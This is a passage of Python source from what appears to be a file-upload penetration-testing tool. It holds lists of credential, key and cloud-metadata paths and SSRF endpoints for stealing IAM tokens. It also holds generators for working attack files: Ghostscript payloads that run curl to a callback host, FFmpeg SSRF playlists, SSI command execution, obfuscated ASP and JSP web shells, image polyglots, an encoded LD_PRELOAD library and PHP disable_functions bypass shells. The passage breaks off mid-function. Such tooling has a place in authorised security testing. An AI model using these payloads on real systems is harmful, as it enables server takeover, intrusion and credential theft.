      "/var/lib/cloud/instance/obj.pkl",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/var/lib/cloud/instance/sem/config_scripts_user",
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/var/log/cloud-init.log",
      "/var/log/cloud-init-output.log",
      "/etc/ec2_version",
      "/etc/aws/credentials",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json"
    ],

    "gcp": [
      "/var/lib/google/instance_id",
      "/var/lib/google/oslogin.cache",
      "/var/lib/google-cloud-ops-agent/log/health-checks.log",
      "/etc/default/instance_configs.cfg",
      "/var/log/google_metadata_script_runner.log",
      "/var/log/google-startup-scripts.log",
      "/var/log/google-shutdown-scripts.log",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/run/cloud-init/instance-data.json"
    ],

    "azure": [
      "/var/lib/waagent/ovf-env.xml",
      "/var/lib/waagent/CustomData",
      "/var/lib/waagent/Incarnation",
      "/var/lib/waagent/GoalState.1.xml",
      "/var/lib/waagent/HostingEnvironmentConfig.xml",
      "/var/lib/waagent/SharedConfig.xml",
      "/var/lib/waagent/Certificates.xml",
      "/var/lib/waagent/TransportPrivate.pem",
      "/var/lib/waagent/TransportCert.pem",
      "/var/log/waagent.log",
      "/var/log/azure/cluster-provision.log",
      "/var/log/azure/custom-script/handler.log",
      "/etc/waagent.conf",
      "C:/WindowsAzure/Logs/WaAppAgent.log",
      "C:/WindowsAzure/Config/",
      "C:/AzureData/CustomData.bin"
    ],

    "openstack": [
      "/var/lib/cloud/seed/config-drive/openstack/latest/meta_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/user_data",
      "/var/lib/cloud/seed/config-drive/openstack/latest/vendor_data.json",
      "/var/lib/cloud/seed/config-drive/openstack/latest/network_data.json",
      "/mnt/config/openstack/latest/meta_data.json",
      "/mnt/config/openstack/latest/user_data"
    ],

    "digitalocean": [
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/run/cloud-init/instance-data.json"
    ],

    "kubernetes_node": [
      "/etc/kubernetes/manifests/kube-apiserver.yaml",
      "/etc/kubernetes/manifests/kube-controller-manager.yaml",
      "/etc/kubernetes/manifests/kube-scheduler.yaml",
      "/etc/kubernetes/manifests/etcd.yaml",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/etc/cni/net.d/"
    ],

    "common_cloudinit": [
      "/etc/cloud/cloud.cfg",
      "/etc/cloud/cloud.cfg.d/",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/scripts/per-instance/",
      "/var/lib/cloud/scripts/per-boot/",
      "/var/lib/cloud/scripts/per-once/",
      "/var/lib/cloud/seed/",
      "/run/cloud-init/cloud-id",
      "/run/cloud-init/ds-identify.log",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/instance-data-sensitive.json"
    ]
  },

  "ssrf_targets": {
    "$note": "HTTP/HTTPS cloud-metadata endpoints. NOT file paths — never routed through --file-read or path-traversal write payloads. Reserved for the SSRF module (ssrf_url) and any future SSRF-aware generator. Each provider sub-key is a flat URL list; provider-specific request-header requirements are documented in $headers.",
    "$headers": {
      "aws_imdsv2":  "PUT /latest/api/token with 'X-aws-ec2-metadata-token-ttl-seconds: 21600', then GET with 'X-aws-ec2-metadata-token: <token>'.",
      "gcp":         "All requests require 'Metadata-Flavor: Google'.",
      "azure":       "All requests require 'Metadata: true'."
    },

    "aws_imdsv1": [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://169.254.169.254/latest/meta-data/iam/info",
      "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
      "http://169.254.169.254/latest/meta-data/instance-id",
      "http://169.254.169.254/latest/meta-data/hostname",
      "http://169.254.169.254/latest/meta-data/local-ipv4",
      "http://169.254.169.254/latest/meta-data/public-ipv4",
      "http://169.254.169.254/latest/meta-data/mac",
      "http://169.254.169.254/latest/user-data/",
      "http://169.254.169.254/latest/dynamic/instance-identity/document",
      "http://169.254.169.254/latest/dynamic/instance-identity/signature"
    ],

    "aws_ecs_task_metadata": [
      "http://169.254.170.2/v2/credentials/",
      "http://169.254.170.2/v2/metadata"
    ],

    "aws_lambda": [
      "http://localhost:9001/2018-06-01/runtime/invocation/next"
    ],

    "gcp": [
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
      "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script",
      "http://metadata.google.internal/computeMetadata/v1/project/project-id",
      "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
      "http://169.254.169.254/computeMetadata/v1/"
    ],

    "azure": [
      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
    ],

    "alibaba": [
      "http://100.100.100.200/latest/meta-data/",
      "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
      "http://100.100.100.200/latest/user-data/"
    ],

    "digitalocean": [
      "http://169.254.169.254/metadata/v1/",
      "http://169.254.169.254/metadata/v1.json",
      "http://169.254.169.254/metadata/v1/user-data",
      "http://169.254.169.254/metadata/v1/hostname",
      "http://169.254.169.254/metadata/v1/region"
    ],

    "openstack": [
      "http://169.254.169.254/openstack/latest/",
      "http://169.254.169.254/openstack/latest/meta_data.json",
      "http://169.254.169.254/openstack/latest/user_data",
      "http://169.254.169.254/openstack/latest/password",
      "http://169.254.169.254/openstack/latest/vendor_data.json"
    ],

    "oracle_cloud": [
      "http://169.254.169.254/opc/v1/instance/",
      "http://169.254.169.254/opc/v1/instance/metadata/",
      "http://169.254.169.254/opc/v2/instance/"
    ],

    "ibm_cloud": [
      "http://169.254.169.254/instance_identity/v1/",
      "http://169.254.169.254/metadata/v1/"
    ],

    "packet_equinix": [
      "https://metadata.packet.net/metadata",
      "https://metadata.platformequinix.com/metadata"
    ],

    "kubernetes_node": [
      "http://169.254.169.254/latest/meta-data/",
      "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
    ]
  }
}
'''
EMBEDDED_PATHS = json.loads(_EMBEDDED_PATHS_JSON)

def _is_dir_path(p):
    """True when p looks like a *filesystem* directory marker — trailing '/'
    or '\\' AND not a URL. Used by the CLI layer to refuse literal
    --file-read on a dir, and by _resolve_paths_key to drop dir leaves from
    @key results without nuking trailing-slash URLs in @ssrf_targets."""
    if not isinstance(p, str) or len(p) <= 1:
        return False
    if p.startswith(("http://", "https://", "ftp://", "ftps://", "gopher://")):
        return False
    return p[-1] in ("/", "\\")


def _validate_file_read_or_die(fr, error_fn):
    """Reject a --file-read argument that points at a directory. Three cases:
      1. literal path (no '@'): must not end with '/' or '\\'
      2. @key resolves to nothing (key invalid or every leaf was a dir): reject
      3. @key resolves to a SINGLE dir leaf (user drilled too far into a dir):
         reject and ask them to pick a file inside
    Multi-leaf @key results are pre-filtered of dirs by _resolve_paths_key,
    so they never reach the dir checks here. error_fn(msg) must not return
    (typically argparse parser.error / sys.exit-style)."""
    if not fr:
        return
    if not fr.startswith("@"):
        if _is_dir_path(fr):
            error_fn(
                "--file-read %r is a directory path. Specify a file inside it "
                "(e.g. %sfoo.conf) — LFI payloads cannot 'read' a directory."
                % (fr, fr))
        return
    resolved = _resolve_paths_key(fr)
    if not resolved:
        error_fn(
            "--file-read %r did not resolve to any file leaves. Either the "
            "@key.path is unknown, or every entry under it was a directory "
            "(directories are filtered). Drill down to a more specific @key "
            "that yields a regular file." % fr)
    if len(resolved) == 1 and _is_dir_path(resolved[0]):
        error_fn(
            "--file-read %r resolves to a single directory leaf (%r). "
            "Pick a file path inside it instead of the directory itself."
            % (fr, resolved[0]))


def _resolve_paths_key(key, registry=None, allow_dirs=False):
    """Resolve '@category.sub[.leaf]' → list[str] of paths from the embedded
    registry (or supplied override). A literal (non-'@') key passes through
    as [key]. Returns None if the key cannot be resolved.

    Walks the tree collecting every string leaf; skips meta-keys starting
    with '$'. By default, directory-style leaves (trailing '/' or '\\')
    are silently dropped — '@linux' must resolve to readable FILES only.
    Pass allow_dirs=True for consumers that legitimately want directories
    (Upname's --webroot drop-target, where /var/www/html/ IS the answer).

    Single-leaf resolution (node is itself a string) is returned as-is so
    the CLI layer can reject a one-dir result with a clear error message."""
    if not isinstance(key, str) or not key.startswith("@"):
        return [key] if key else None
    reg = registry if registry is not None else EMBEDDED_PATHS
    parts = key[1:].split(".")
    node = reg
    for p in parts:
        if isinstance(node, dict) and p in node:
            node = node[p]
        else:
            return None
    if isinstance(node, str):
        return [node]
    leaves = []
    def _ok(s):
        return (isinstance(s, str)
                and not s.startswith("$")
                and (allow_dirs or not _is_dir_path(s)))
    def _walk(n):
        if isinstance(n, str):
            if _ok(n):
                leaves.append(n)
        elif isinstance(n, list):
            for x in n:
                if _ok(x):
                    leaves.append(x)
        elif isinstance(n, dict):
            for k, v in n.items():
                if k.startswith("$"):
                    continue
                _walk(v)
    _walk(node)
    return leaves or None
# ─── END EMBEDDED PATHS ──────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# GENERATORS  — each returns list of (label, content_bytes, [extensions])
# ─────────────────────────────────────────────────────────────────────────────
OAST = "OAST.example.com"          # placeholder OOB callback host (override: --oast)
PROBE = "UpMapProbe"
CMD_PARAM = "cmd"                  # command parameter built-in shells read (--cmd-param)
CUSTOM_SHELLS = {}                 # lang -> raw shell bytes, from --shell
ALLOWED = None                     # mimic this accepted type's magic/ext (--allowed)
FILE_READ = None                   # --file-read PATH: override target for every LFI payload
                                   # (file:// / php://filter / netdoc: / xi:include /
                                   # xslt document() / esi:include / ssi #include /
                                   # ssrf file:// / csv HYPERLINK file:// / ghostscript
                                   # .libfile). None = each payload keeps its hardcoded
                                   # default (/etc/passwd, win.ini, /etc/hostname, ...).
                                   # xxe_dos_devrandom is deliberately NOT overridden —
                                   # its /dev/random target is DoS-intentional, not LFI.

def _resolve_file_read():
    """Resolve --file-read once per call. Returns a single path string or None.
    - Literal path  ('/etc/passwd', '/proc/self/environ') → returned as-is.
    - @key.path     ('@linux.credentials', '@aws')        → resolved against the
      embedded paths.json registry; first leaf wins (override mode is single-
      target by design — to fan out across an entire category, use Upname
      which is wordlist-shaped).
    Returns None if --file-read is unset OR if the @key fails to resolve
    (callers fall back to the per-payload default in that case)."""
    if not FILE_READ:
        return None
    if FILE_READ.startswith("@"):
        resolved = _resolve_paths_key(FILE_READ)
        return resolved[0] if resolved else None
    return FILE_READ


def _lfi(default):
    """Resolve a local-file-read target. If --file-read is set, every LFI payload
    routes through here and gets the user override; otherwise the per-payload
    hardcoded path is returned unchanged. Pass an absolute filesystem path
    (e.g. '/etc/passwd' or '/c:/windows/win.ini'); callers needing encoding
    (urlenc bypass, char-ref bypass) wrap the result themselves.
    Accepts @key.path lookups (e.g. '@linux.credentials.id_rsa')."""
    override = _resolve_file_read()
    return override if override else default


def _lfi_urlenc(default, depth=1):
    """LFI target URL-encoded `depth` times (slashes → %2F → %252F)."""
    from urllib.parse import quote
    override = _resolve_file_read()
    p = override if override else default
    for _ in range(depth):
        p = quote(p, safe="")
    return p


def _lfi_charref(default):
    """LFI target with first non-slash character replaced by its &#xNN; char-ref
    (the bypass variant that hides one letter from naive blocklists)."""
    override = _resolve_file_read()
    p = override if override else default
    for i, ch in enumerate(p):
        if ch != "/":
            return p[:i] + f"&#x{ord(ch):x};" + p[i + 1:]
    return p

# --shell LANG token -> internal language key
SHELL_LANG_KEYS = {
    "php": "php", "asp": "asp", "aspx": "asp", "jsp": "jsp", "jspx": "jsp",
    "coldfusion": "coldfusion", "cfm": "coldfusion", "cfml": "coldfusion",
    "perl": "perl", "pl": "perl", "cgi": "perl", "py": "perl", "python": "perl",
    "rb": "perl", "ruby": "perl",
}


def _sub_cmd(content, p):
    """Swap the command-parameter name in a built-in shell (default 'cmd').
    Targeted so it never touches unrelated tokens like 'cmd.exe'."""
    if p == "cmd":
        return content
    pe = p.encode()
    reps = [
        (b"$_GET['cmd']",        b"$_GET['" + pe + b"']"),
        (b'QueryString("cmd")',  b'QueryString("' + pe + b'")'),
        (b'Request["cmd"]',      b'Request["' + pe + b'"]'),
        (b'getParameter("cmd")', b'getParameter("' + pe + b'")'),
        (b"URL.cmd#",            b"URL." + pe + b"#"),
        (b"getvalue('cmd'",      b"getvalue('" + pe + b"'"),
        (b"c['cmd']",            b"c['" + pe + b"']"),
    ]
    for old, new in reps:
        content = content.replace(old, new)
    return content


def shells_for(lang):
    """Shells to use for a language: custom (--shell) when provided, else the
    built-ins with --cmd-param applied. lang None falls back to php."""
    lang = lang or "php"
    if lang in CUSTOM_SHELLS:
        return [(CUSTOM_SHELLS[lang], EXT.get(lang, EXT["php"]), "rce")]
    return [(_sub_cmd(c, CMD_PARAM), e, l) for c, e, l in SHELLS.get(lang, [])]


def _cb(path=""):
    """Callback URL from the configured OAST host (adds http:// if no scheme)."""
    base = OAST if "://" in OAST else "http://" + OAST
    return base.rstrip("/") + "/" + path


def _xbm_overflow(width=3000, height=3000, bpl=12):
    """XBM with the 0x80000001 integer-overflow value (GraphicsMagick PoC)."""
    lines = [f"#define u_width {width}", f"#define u_height {height}",
             "static char u_bits[] = {", "  0x80000001, "]
    total = (width * height) // 8 - bpl
    while total > 0:
        chunk = min(bpl, total)
        lines.append("  " + "0x00, " * chunk)
        total -= chunk
    lines.append("};")
    return "\n".join(lines).encode()


# Real AVI header (UploadScanner AviM3uXbin) used to wrap an M3U for FFmpeg SSRF.
AVI_HEADER = (
    b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00"
    b"\x40\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00"
    b"\x7d\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
    b"\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00LIST\x74\x00\x00\x00strlstrh"
    b"8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00"
    b"\x00\x7d\x00\x00\x00\x86\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf\x28\x00\x00\x00\x28\x00"
    b"\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID"
    b"\x00\x48\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x00\x00\x00LIST    movi"
)


def _ghostscript_payloads(cb):
    """Ghostscript LFI (CVE-2016-7977) / SSRF / RCE / type-confusion (2018-16509)."""
    lfi = (f"%!PS\n/Buf 1024 string def\n({_lfi('/etc/passwd')}) .libfile {{\n"
           f"  {{ dup Buf readline {{ 0 0 moveto show }}{{ showpage quit }} ifelse }}"
           f" loop\n}} if\n").encode()
    ssrf = (b"%!PS-Adobe-3.0\n(" + cb.encode() + b") (r) file\nstatusdict begin\n("
            + cb.encode() + b") = flush\n")
    rce = (b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n"
           b"userdict /setPageDevice undef\n<<\n/HWResolution [72 72]\n"
           b">> setpagedevice\n(curl " + cb.encode() + b") runlength\n")
    tc = (b"%!PS\n{ null restore } stopped { pop } if\n"
          b"mark /OutputFile (%pipe%curl " + cb.encode()
          + b") currentdevice putdeviceprops\n")
    exts = ["eps", "gs", "ps", "pdf"]
    return [("ghostscript_lfi", lfi, exts), ("ghostscript_ssrf", ssrf, exts),
            ("ghostscript_rce", rce, exts), ("ghostscript_typeconfusion", tc, exts)]


def _libav_payloads(cb):
    """LibAVFormat/FFmpeg SSRF via HLS M3U (plain + AES key) and AVI-wrapped M3U."""
    m3u = (b"#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\n"
           + cb.encode() + b"\n#EXT-X-ENDLIST\n")
    m3u_key = (b'#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXT-X-KEY: METHOD=AES-128,URI="'
               + cb.encode() + b'",IV=0x00000000000000000000000000000000\n'
               b"#EXTINF:10.0,\n/dev/zero\n#EXT-X-BYTERANGE:16\n#EXT-X-ENDLIST\n")
    return [("libav_m3u", m3u, ["m3u8", "m3u"]),
            ("libav_m3u_key", m3u_key, ["m3u8"]),
            ("libav_avi", AVI_HEADER + m3u, ["avi"])]


def _ssi_payloads():
    """Server-Side Includes — exec / include LFI / env echo / printenv / OAST."""
    cb = _cb(PROBE)
    items = [
        b'<!--#exec cmd="id" -->',
        b'<!--#exec cmd="whoami" -->',
        b'<!--#exec cmd="echo ' + PROBE.encode() + b'" -->',
        b'<!--#exec cmd="nslookup ' + PROBE.encode() + b'.upmap.local" -->',  # DNS-blind
        f'<!--#include virtual="{_lfi("/etc/passwd")}" -->'.encode(),
        f'<!--#include file="{_lfi("/etc/passwd")}" -->'.encode(),
        b'<!--#echo var="DOCUMENT_NAME" -->',
        b'<!--#echo var="SERVER_NAME" -->',
        b'<!--#echo var="DATE_LOCAL" -->',
        b'<!--#printenv -->',
        b'<!--#exec cmd="curl ' + cb.encode() + b'" -->',
    ]
    return [("ssi", p, ["shtml", "stm", "shtm", "html"]) for p in items]


def _asp_obf(param):
    """ASP/VBScript source-obfuscation set (parallels UpMap mod_asp_obfuscation).
    Byte-identical payloads. VBScript.Encode is the static ASP_VBE_BLOB."""
    inner = (f'Response.Write(CreateObject("WScript.Shell")'
             f'.Exec(Request("{param}")).StdOut.ReadAll())')
    cc  = "&".join(f"Chr({ord(c)})" for c in inner)
    enc = "".join("%" + str(ord(c) + 66) for c in inner)
    htmlcomment = (f'<%\r\n<!--"-->\r\nExecute Request("{param}")\r\n%>').encode()
    chrv  = (f'<% Execute({cc}) %>').encode()
    arith = (f'<%<!--"-->\r\nExecute(fun("{enc}"))\r\n'
             f'Function fun(s)\r\ns=Split(s,"%")\r\n'
             f'For x=1 To Ubound(s)\r\nfun=fun&Chr(s(x)-66)\r\nNext\r\n'
             f'End Function\r\n%>').encode()
    sc    = (f'<%\r\nSet o=Server.CreateObject("MSScriptControl.ScriptControl")\r\n'
             f'o.Language="VBScript"\r\no.AddObject "Response",Response\r\n'
             f'o.AddObject "Request",Request\r\n'
             f'o.ExecuteStatement "Execute(Request(""{param}""))"\r\n%>').encode()
    runat = (f'<script language=vbscript runat=server>\r\n'
             f'If Request("{param}")<>"" Then Execute Request("{param}")\r\n'
             f'</script>').encode()
    decoded = f"Response.CodePage=65001:{inner}"
    u7      = base64.b64encode(decoded.encode("utf-16-be")).decode().rstrip("=")
    utf7    = b"<%@codepage=65000%>\r\n<%\r\n+" + u7.encode() + b"-\r\n%>"
    asp_shell = shells_for("asp")[0][0]
    return [
        ("rce_obfuscated",       htmlcomment, EXT["asp"]),
        ("rce_obfuscated",       chrv,        EXT["asp"]),
        ("rce_obfuscated",       arith,       EXT["asp"]),
        ("rce_obfuscated",       sc,          EXT["asp"]),
        ("rce_obfuscated",       runat,       EXT["asp"]),
        ("rce_obfuscated",       utf7,        EXT["asp"]),
        ("rce_vbscript_encode",  ASP_VBE_BLOB, EXT["asp"]),
        ("rce_polyglot",         MAGIC.get("jpg", b"") + b"\n" + asp_shell, EXT["asp"] + ["jpg"]),
        ("rce_polyglot",         b"GIF89a" + asp_shell, EXT["asp"] + ["gif"]),
    ]


def _jsp_obf(param):
    """JSP source-obfuscation set (parallels UpMap mod_jsp_obfuscation)."""
    def jb(s):
        return "new String(new byte[]{" + ",".join(str(b) for b in s.encode()) + "})"
    b64_rt   = base64.b64encode(b"java.lang.Runtime").decode()
    b64_exec = base64.b64encode(b"exec").decode()
    b64_grt  = base64.b64encode(b"getRuntime").decode()
    pb_simple = (f'<% new ProcessBuilder(request.getParameter("{param}")).start(); %>').encode()
    pb_output = (f'<% java.io.InputStream is=new ProcessBuilder({jb("cmd")},{jb("/C")},'
                 f'request.getParameter("{param}")).start().getInputStream();int _c;'
                 f'while((_c=is.read())!=-1){{out.print((char)_c);}} %>').encode()
    barray    = (f'<% new ProcessBuilder({jb("/bin/bash")},{jb("-c")},'
                 f'request.getParameter("{param}")).start(); %>').encode()
    reflect   = (f'<% Class _r=Class.forName(new String(java.util.Base64.getDecoder()'
                 f'.decode("{b64_rt}")));_r.getMethod(new String(java.util.Base64'
                 f'.getDecoder().decode("{b64_exec}")),String.class).invoke('
                 f'_r.getMethod(new String(java.util.Base64.getDecoder().decode("{b64_grt}")))'
                 f'.invoke(null),request.getParameter("{param}")); %>').encode()
    src       = f'Runtime.getRuntime().exec(request.getParameter("{param}"));'
    uni       = b"<%" + "".join("\\u%04x" % ord(c) for c in src).encode() + b"%>"
    jsp_shell = shells_for("jsp")[0][0]
    return [
        ("rce_obfuscated", pb_simple, EXT["jsp"]),
        ("rce_obfuscated", pb_output, EXT["jsp"]),
        ("rce_obfuscated", barray,    EXT["jsp"]),
        ("rce_obfuscated", reflect,   EXT["jsp"]),
        ("rce_obfuscated", uni,       EXT["jsp"]),
        ("rce_polyglot",   b"GIF89a\n" + jsp_shell, EXT["jsp"] + ["gif"]),
        ("rce_polyglot",   MAGIC.get("jpg", b"") + b"\n" + jsp_shell, EXT["jsp"] + ["jpg"]),
    ]


# ── PHP disable_functions / alternative-execution RCE (synced from UpMap) ──────
# Valid 64-bit LD_PRELOAD system.so, zlib+base64-packed → hex string (PHP hex2bin()
# rebuilds the .so). 32-bit blob is intentionally omitted (UpMap's was corrupt), so
# the 32-bit LD_PRELOAD branch is a harmless no-op; the 64-bit path is unaffected.
try:
    _SO_X64_HEX = zlib.decompress(base64.b64decode(
        "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"
    )).decode()
except Exception:
    _SO_X64_HEX = ""


def _php_disable_func_payloads(param):
    """disable_functions / alternative-execution RCE bodies (l3m0n + classic CVEs),
    byte-identical to UpMap's set. Each is a self-contained PHP file that runs
    ?<param>= via a non-system() vector and echoes the result.
    Returns [(label, php_bytes), …]. 32-bit LD_PRELOAD is a no-op (blob omitted)."""
    snippets = {
        # pcntl_exec — fork + exec /bin/bash on a written script
        "df_pcntl_exec": r'''<?php
$c=$_GET["__P__"];$o=tempnam(sys_get_temp_dir(),"o");$s=tempnam(sys_get_temp_dir(),"s");
file_put_contents($s,"#!/bin/bash\n".$c." >".$o." 2>&1\n");@chmod($s,0755);
$pid=pcntl_fork();if($pid==0){pcntl_exec("/bin/bash",array($s));}
else{pcntl_waitpid($pid,$st);echo @file_get_contents($o);@unlink($o);@unlink($s);}
?>''',
        # imap_open -oProxyCommand injection (CVE-2018-19518)
        "df_imap_open": r'''<?php
$c=$_GET["__P__"];$o="/tmp/o_".getmypid();
